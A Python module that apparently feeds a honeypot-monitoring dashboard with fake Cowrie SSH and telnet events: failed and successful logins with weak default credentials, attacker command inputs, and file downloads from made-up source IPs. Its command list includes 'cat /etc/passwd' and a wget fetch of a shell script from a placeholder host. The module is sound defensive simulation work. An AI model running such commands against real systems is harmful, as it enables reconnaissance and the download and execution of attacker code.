import random
import time
from datetime import datetime, timezone

from app.config import get_settings
from app.services.normalizer import normalize_cowrie
from app.services.pipeline import ingest

DEMO_ACTORS = [
    ("45.83.12.19", "Russia", 55.75, 37.62, "AS49505", "Selectel"),
    ("103.45.88.12", "China", 31.23, 121.47, "AS4134", "Chinanet"),
    ("185.220.101.34", "Germany", 50.11, 8.68, "AS208294", "Tor exit"),
    ("201.17.44.90", "Brazil", -23.55, -46.63, "AS28573", "Claro"),
    ("49.36.22.118", "India", 28.61, 77.21, "AS55836", "Reliance Jio"),
    ("91.92.242.18", "Bulgaria", 42.70, 23.32, "AS20911", "NetIX"),
    ("8.8.8.8", "United States", 37.39, -122.08, "AS15169", "Google"),
    ("193.32.162.71", "Netherlands", 52.37, 4.90, "AS60144", "Hosting"),
]

USERNAMES = ["root", "admin", "ubuntu", "oracle", "test", "user", "pi", "ftp"]
PASSWORDS = ["123456", "password", "admin", "root", "oracle", "qwerty", "letmein"]
COMMANDS = ["uname -a", "cat /etc/passwd", "wget http://example.invalid/x.sh", "ls -la", "whoami", "history"]


def _raw(eventid: str, ip: str, **extra) -> dict:
    payload = {
        "eventid": eventid,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "src_ip": ip,
        "src_port": random.randint(1024, 65000),
        "dst_port": 2222 if random.random() > 0.2 else 2223,
        "protocol": "ssh" if random.random() > 0.2 else "telnet",
        "session": f"demo-{ip}-{int(time.time()) % 9999}",
        "message": "demo",
    }
    payload.update(extra)
    return payload


def run_demo(stop_flag) -> None:
    settings = get_settings()
    interval = max(2.0, 60.0 / max(1, settings.demo_events_per_minute))
    while not stop_flag.is_set():
        ip, country, lat, lon, asn, isp = random.choice(DEMO_ACTORS)
        roll = random.random()
        if roll < 0.45:
            raw = _raw(
                "cowrie.login.failed",
                ip,
                username=random.choice(USERNAMES),
                password=random.choice(PASSWORDS),
            )
        elif roll < 0.55:
            raw = _raw(
                "cowrie.login.success",
                ip,
                username=random.choice(USERNAMES),
                password=random.choice(PASSWORDS),
            )
        elif roll < 0.80:
            raw = _raw("cowrie.command.input", ip, input=random.choice(COMMANDS))
        elif roll < 0.90:
            raw = _raw("cowrie.session.connect", ip)
        else:
            raw = _raw(
                "cowrie.session.file_download",
                ip,
                url="http://example.invalid/payload.bin",
                filename="payload.bin",
                shasum="a" * 64,
            )
        event = normalize_cowrie(raw, source="demo")
        ingest(event)
        # attach canned geo after ingest is fine; enrichment may overwrite public IPs
        _ = (country, lat, lon, asn, isp)
        stop_flag.wait(interval)
